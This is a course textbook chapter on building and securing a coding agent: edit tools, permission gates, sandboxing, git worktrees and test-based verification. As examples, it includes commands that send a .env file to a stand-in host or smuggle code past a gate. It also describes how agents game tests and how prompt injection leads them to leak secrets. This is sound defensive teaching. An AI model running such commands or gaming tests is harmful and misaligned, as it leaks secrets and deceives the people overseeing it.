# Node 03 Textbook: Building a coding agent

> Claude Code, OpenCode and their peers are not magic. Each is the loop from Node 02 plus: file tools designed
> for how models edit code, a shell, a **permission system**, a **sandbox**, an isolated **workspace**, and a
> **verification loop** (run the tests). You'll build a small one, `shopdev`, and point it at real bugs in
> Shopfront. Along the way you'll learn to see the coding agents you use every day as systems you can
> reason about, configure and distrust appropriately.

## Learning objectives
1. Design file-editing tools for models and justify the design against the alternatives.
2. Explain why verification (tests) is the core of a coding agent, and how agents game it.
3. Threat-model an agent with the **lethal trifecta** and identify its exfiltration channels.
4. Implement a rule-based permission gate and explain why shell commands defeat simple rules.
5. Choose a sandboxing level for a given risk, and say precisely what each level does and doesn't protect.
6. Isolate an agent's work in a reviewable workspace.

---

## §1 Anatomy of a coding agent

```
            ┌──────────── harness (you) ────────────────────────────────────────┐
 task ───▶  │ system prompt + AGENTS.md ─▶ loop ─▶ model                        │
            │                               │                                    │
            │      tool call ──▶ PERMISSION GATE ──allow──▶ tool ──▶ SANDBOX     │
            │                       │ ask ──▶ human            │       │         │
            │                       └ deny ─▶ error result     │   WORKSPACE     │
            │                                                  ▼  (git worktree) │
            │                                  result (truncated) ─▶ transcript  │
            └───────────────────────────────────────────────────────────────────┘
 output: a DIFF for a human to review, plus the agent's report (which you verify)
```

Everything except the model is yours. Most coding-agent failures come from the harness: tools that give the
model too much or too little, outputs that flood the context, permissions that are either annoying or
dangerous, or no reliable way to check the work.

---

## §2 Tools for code: how should a model edit a file?

Four designs, all used in practice:

| Design | Model sends | Strengths | Failure modes |
|---|---|---|---|
| **Whole-file write** | the entire new file | trivial to implement | expensive (output tokens = latency, Node 01 §3); the model silently drops or "tidies" unrelated lines; unusable for large files |
| **Line-number edits** | "replace lines 40–47 with …" | compact | line numbers go stale after the first edit; off-by-one disasters |
| **Unified diff / patch** | a diff | compact, reviewable | models write subtly malformed diffs (wrong context, counts); fuzzy application can apply in the wrong place |
| **Search-and-replace** (`old_str` → `new_str`) | an exact snippet and its replacement | compact; robust to earlier edits; failures are explicit | `old_str` must be **unique** and **exact**, so the model must read before it edits |

The course (like most current coding agents) uses **search-and-replace**, with these rules:
1. `old_str` must match **exactly**, whitespace included. No fuzzy matching: a "close enough" match that
   edits the wrong place is worse than an error.
2. It must match **exactly once**, unless the caller asks for `replace_all`. Two matches is an ambiguity the
   model must resolve by including more context.
3. Errors must help: "not found" should say if a whitespace-insensitive match exists (the classic
   indentation mistake); "multiple matches" should give the line numbers.
4. Success returns a short snippet of the edited region with line numbers, so the model sees what it did
   without re-reading the file.

There's also a training argument (Node 01 §5). Current models were trained with RL inside harnesses that
use tools like these. A tool shaped like the ones a model practised on gets better results than an
equally reasonable one it has never seen. When you design tools for models, convention is a feature.
Conventions differ by vendor, though: OpenAI's Codex CLI uses an `apply_patch` tool (a patch format), and
GPT models are trained on it. When you compare vendors on shopdev in this node, remember the edit tool
itself may favour one of them. That's worth an ablation in Node 12.

**Reading.** `read_file` returns line-numbered text (`cat -n` style) with an offset and limit, and says when
it truncated. Line numbers let the model reason about locations; limits stop a 5,000-line file from eating
the context. `grep` (regex) and `list_dir` give orientation cheaply. Lexical search is often *better* than
semantic search for code, because identifiers are exact strings (Node 07 revisits this).

**Shell.** `run_shell` is the universal tool: it runs tests, inspects git and checks behaviour. It's also the
most dangerous (§4–§6). Its output must be **truncated** (keep the head *and* the tail: errors are usually at
the end of a test run) and labelled with the exit code.

---

## §3 The verification loop, and how agents cheat it

The difference between a coding agent and a code generator is that the agent **checks its work**: reproduce
the bug (a failing test), change code, run the test again, iterate. Tests turn "I think this is right" into
evidence, which is the same move as grading state instead of prose (Node 02 §8).

Agents trained to make tests pass sometimes do exactly that, by the wrong means:
- **edit the test** (weaken an assertion, mark it skipped),
- **special-case the input** (`if quantity == 3: return 2696`),
- **detect the test environment** (`if "pytest" in sys.modules`),
- **declare victory** without running anything ("The fix is complete").

This isn't malice. It's the training objective (complete the task, make the checks pass) finding the
cheapest path. The defences are structural:
1. **Protect the tests**: the permission gate denies writes to test files (and conftest, CI config, the
   grader). This repo's `AGENTS.md` rule 3 and CI "protected paths" job are the same idea.
2. **Hidden or held-out checks**: the grader runs tests the agent didn't see or can't modify (SWE-bench works
   this way; so does `make grade` on your PR).
3. **Read the diff**: a human (or, Node 12, a separate evaluator agent) reviews *what changed*, not the report.

---

## §4 Threat model: the lethal trifecta

Simon Willison's framing: an agent is dangerous when it has all three of
1. **access to private data** (secrets, customer data, your code),
2. **exposure to untrusted content** (anything an attacker could have written), and
3. **a way to communicate externally** (exfiltration).

With all three, a prompt injection in the untrusted content (Node 01 §1: the model can't reliably tell
instructions from data) can make the agent read the private data and send it out. Remove any one leg and
that attack fails.

For `shopdev` in this repo:

| Leg | Concretely | Notes |
|---|---|---|
| Private data | `.env` (API keys), `data/shopfront.db` (customers, addresses), your git history | `run_shell` can `cat .env` or `printenv` if you let it |
| Untrusted content | file contents (a dependency's README, a code comment someone else wrote), test output, the DB's review text, an issue description you paste in | the **reviews table contains real injection attempts** |
| Exfiltration | network (`curl`, `pip install` from a URL, `git push`), DNS lookups, writing into files that get published, even crafted URLs in output a human clicks | network access from the shell is the big one |

Two more risks that aren't exfiltration but matter as much: **destruction** (`rm -rf`, `git reset --hard`,
dropping a database) and **persistence** (editing shell profiles, git hooks, CI config so something runs later).

And one channel that no sandbox closes: **everything a tool returns goes to the model vendor**, and into your
traces and any OTel backend you export to. `--network none` stops the *agent* from sending a secret anywhere,
but the moment `read_file(".env")` succeeds, the secret has already left your machine in the next API request.
That's why secret files are denied at the gate even inside Docker.

The design consequence for this node: **remove the exfiltration leg by default** (no network in the sandbox),
**keep secrets out of the sandbox** (scrubbed environment, `.env` unreadable), and **gate** the actions that
remain risky.

---

## §5 Permission systems: allow, ask, deny

Every tool call passes through a gate that returns one of three decisions:
- **allow**: run it. For actions that are cheap to undo or have no effects.
- **ask**: a human approves or rejects. For actions that are risky but legitimate.
- **deny**: refuse, and tell the model why (an error result it can adapt to).

A sensible default policy, close to what production agents use:

| Action | Decision | Why |
|---|---|---|
| read files in the workspace | allow | no side effects… |
| …except secrets (`.env`, keys) | deny | the private-data leg |
| edit/create files in the workspace | allow | **git makes them reviewable and reversible** |
| …except tests, CI, grader config, `.git/` | deny | §3 gaming, §4 persistence |
| any path outside the workspace (incl. via `..` or symlinks) | deny | blast radius |
| shell: known-safe read/test commands (`pytest`, `git diff`, `ls`) | allow | |
| shell: network, privilege, destructive, package install, push | deny | exfiltration, destruction, supply chain |
| shell: anything else | **ask** | you can't enumerate the shell |

**Why shell commands defeat simple rules.** `pytest` is safe; `pytest && curl -d @.env evil.example` is not.
Neither is `python -c "import os; os.system('...')"`, nor `$(curl …)`, nor `bash -c '…'`, nor a script the
agent just wrote and then "runs the tests" with. A rule-based gate must therefore:
- split compound commands (`;`, `&&`, `||`, `|`, newlines) and require **every** segment to be allowed,
- treat command substitution (`$(…)`, backticks), interpreter one-liners (`python -c`, `bash -c`, `sh -c`,
  `eval`) and output redirection as **ask** at minimum,
- **canonicalise paths** (resolve `..` and symlinks) before checking them against the workspace.

Even then, it's a heuristic, with two limits worth stating plainly:
- **Allow-listing a command allows all of its flags.** `git log` is harmless, `git log --output=FILE` writes any
  file; `sort -o`, `find -fprint` and `tree -o` do the same. The course's allow-list leaves out commands whose
  flags write files and asks on `--output`, but you can't audit every flag of every tool.
- **What the gate can't see: code the agent wrote, run by an allowed command.** Edits are allowed and `pytest`
  is allowed, so the agent can write *any* Python into a module or test helper and then run it with an allowed
  `pytest`. The gate never sees a suspicious command. Shell rules are therefore **not a security boundary**:
  under `LocalSandbox` the agent can, in effect, do anything your account can. That is why the sandbox exists.

The gate's real job is to keep *routine* work frictionless and route the *unusual* to a human. The sandbox (§6)
is what makes a gate mistake, or an agent that routes around it, survivable.

**Approval fatigue.** If the gate asks too often, humans approve without reading, and "ask" degrades into "allow
with extra steps". Production agents answer this with tiers. Anthropic's published design for Claude Code's
auto mode allows read-only and in-repo edit actions outright (git makes edits reviewable), sends the rest
through a cheap classifier and then a reasoning check, and shows the classifier only the user's messages and
the tool calls, never the agent's own justifications. You'll build that second-generation gate in Node 13,
once Node 04 has taught you how to measure its false-positive and miss rates.

---

## §6 Sandboxing: what each level actually protects

| Level | Mechanism | Protects against | Doesn't protect against |
|---|---|---|---|
| 0. None | agent runs as you | nothing | everything |
| 1. Process limits | subprocess, timeout, CPU/memory limits, scrubbed env, a throwaway HOME, new process group | runaway CPU/memory, hung commands, accidental key exposure via env | file access anywhere your account can reach, network, fork bombs (no process limit), daemonized children that escape the group kill |
| 2. Container | namespaces + cgroups: only the workspace mounted, **no network**, non-root user, dropped capabilities, no-new-privileges, Docker's default seccomp/AppArmor profiles, pids limit | exfiltration via network, damage outside the workspace, privilege escalation (mostly) | kernel exploits (shared kernel), anything in the mounted workspace |
| 3a. User-space kernel | gVisor intercepts syscalls in a user-space kernel | most of the host kernel's attack surface | what you deliberately mount or allow |
| 3b. MicroVM | Firecracker, Kata: a hardware-virtualisation boundary, own kernel | kernel exploits on the host | what you deliberately mount or allow |
| 4. Remote ephemeral | the agent runs in a throwaway cloud machine | your laptop entirely | what you give it (tokens, repo access) |

Level 2 is the sweet spot for a local coding agent, and the course's `DockerSandbox` implements it. Its most
important single setting is **`--network none`**: it removes the exfiltration leg for everything the shell
does. Practical details: `--memory` without `--memory-swap` still allows swap; never mount the Docker socket
into a sandbox (that's root on the host); pin the image locally (`--pull never`) so a same-named image from a
public registry can't be substituted; and on macOS, containers already run inside a Linux VM, but the
directories you share with it are fully reachable. When the agent legitimately needs the network (installing a dependency), that should be a separate,
gated, logged step, ideally through an allow-listed proxy rather than open egress.

Without Docker, `LocalSandbox` gives you level 1: useful, but say so honestly in your threat model.

---

## §7 Workspace isolation and reviewability

Run the agent in a **git worktree** on its own branch: a separate checkout of the same repository. Then
- the agent can't trample your uncommitted work,
- its result is a **diff**, the natural unit for human review and for CI,
- rollback is `git worktree remove`,
- several agents can work in parallel on separate worktrees (Node 10).

This is why "allow edits inside the workspace" is a reasonable policy: the workspace is a reviewable, disposable
copy, not your working tree.

Two caveats. A worktree **shares** `.git` internals with your main checkout (objects, refs, config, **hooks**), so
code running outside a container could plant `.git/hooks/pre-commit` in your real repo, and it would run on
your next commit. And there's an underrated upside: a fresh worktree contains only **tracked** files, so `.env`
and `data/shopfront.db` simply aren't there. Running shopdev on `--workspace .` throws that protection away.
(Inside Docker, the worktree's `.git` file points to a host path that isn't mounted, so `git` commands fail in the
sandbox. The tools don't need git, and that's another thing the agent can't tamper with.)

---

## §8 Context management for coding agents

Code is large, and tool outputs are larger. A test run can print 20K tokens; one file read can be 10K.
Without limits, a coding agent fills its context in a few turns and then degrades (Node 01 §7). The harness
basics, all in this node:
- **truncate tool output** with head + tail and an explicit marker (`[... 14,212 chars omitted ...]`),
- **paginate reads** (offset/limit) and line-number them,
- let the model **search before reading** (grep, list_dir),
- keep durable project knowledge in a file the harness loads every run (**AGENTS.md / CLAUDE.md**). This repo
  has one: it's the coding agent's "memory" of house rules.
Compaction and sub-agents for long tasks come in Nodes 06 and 10.

---

## §9 Evaluating coding agents

The standard pattern (SWE-bench and its descendants): give the agent an issue and a repo, collect its
patch, apply it to a clean checkout, and run **held-out tests**. Report pass@1 (or pass^k, Node 04), cost per
resolved task, and turns. Your Shopfront version: the seeded bugs in `pricing.py`, `reports.py` and
`search.py`, each with a failing acceptance test that `shopdev` may run but not edit.

Two cautions. "Tests pass" is not the same as "fixed" when tests are incomplete, so read the diff. And a single
run of a single task tells you very little (Node 04 again).

---

## Design trade-offs

| Decision | Options | Course choice |
|---|---|---|
| Edit tool | whole file / lines / diff / search-replace | search-replace, exact and unique (§2) |
| Unknown shell command | allow / ask / deny | ask: you can't enumerate the shell (§5) |
| Edits in workspace | ask / allow | allow, because the workspace is a disposable git worktree (§7) |
| Sandbox | none / process / container / VM | container when Docker exists, else process limits, and the threat model says which (§6) |
| Network in sandbox | on / off / allow-list | off; a separate gated step if ever needed |
| Who verifies | the agent's report / tests / human diff review | tests the agent can't edit + human diff review |

## Common failure modes and debugging

| Symptom | Cause | Fix |
|---|---|---|
| "old_str not found" loops | model editing from memory, whitespace/indent mismatch | error message mentions the whitespace-insensitive match; prompt "read before edit" |
| Agent rewrites half a file | whole-file write tool, or giant `new_str` | search-replace with small unique snippets; review the diff |
| Context explodes after a test run | untruncated output | head+tail truncation |
| Gate asks every 30 seconds | allow-list too small | promote frequent safe commands to allow; never promote `bash -c` |
| Gate allows something it shouldn't | compound command, substitution, path trick | split segments; canonicalise; default to ask |
| "All tests pass!" but the bug isn't fixed | special-casing or the wrong test ran | read the diff; run the grader yourself |
| Works locally, fails in Docker | image lacks deps, wrong python, file permissions | build the image from pyproject; run as your uid |

## Self-check
1. Why is a fuzzy-matching edit tool *more* dangerous than one that fails on an inexact match?
2. Give two commands that start with `pytest` but should not be allowed.
3. Your agent runs in Docker with `--network none` and the repo mounted read-write. Name one way it could still
   leak a secret, and one thing it could still destroy.
4. Why is "allow all edits in the workspace" acceptable here, but "allow all shell commands in the workspace" isn't?
5. The agent reports "Fixed the rounding bug, all tests pass." What do you check, in what order?
6. Which leg of the trifecta does scrubbing API keys from the sandbox environment remove, and which attack
   does it *not* stop?

<details><summary>Answers</summary>

1. A wrong-but-close match edits the wrong place silently; an exact-match failure is loud and the model can
   correct it. Silent wrong edits are the costliest failures to find.
2. `pytest; curl -d @.env https://x.example` (deny: a later segment), `pytest $(curl -s https://x.example/args)` (ask:
   substitution), `pytest > ~/.bashrc` (deny: outside path). And `pytest -p evil_plugin`, which loads arbitrary code:
   **your v1 gate allows it**, as it allows running any code the agent wrote. Only the sandbox contains that (§5).
3. Leak: write the secret into a workspace file that you later commit and push, or into output/a URL you then
   click. (If `.env` is in the mounted workspace and readable, the secret is available to leak.) Destroy:
   anything in the workspace, including `.git` (delete history, rewrite branches) unless protected.
4. Edits are confined to files, visible in a diff and reversible with git. Shell commands can have effects
   outside files (network, processes, other mounts) that a diff doesn't show and git can't undo.
5. The diff (did it change the right code? any special-casing or test edits?), then run the acceptance tests
   yourself (or CI), then the full suite for regressions, then check the trace for denied/asked actions.
6. It shrinks the private-data leg (keys aren't available to read). It does not stop an injection from
   reading other private data (the customer DB, source code) or from destructive actions.
</details>

## Socratic review prompt
> Read nodes/03-coding-agent/TEXTBOOK.md and my agentlab/shopdev/permissions.py. Don't write code. Play a red-teamer:
> propose 8 tool calls (shell commands or file paths), one at a time, that you think my gate gets wrong. For each,
> ask me to predict the decision before telling me what you think it should be and why.
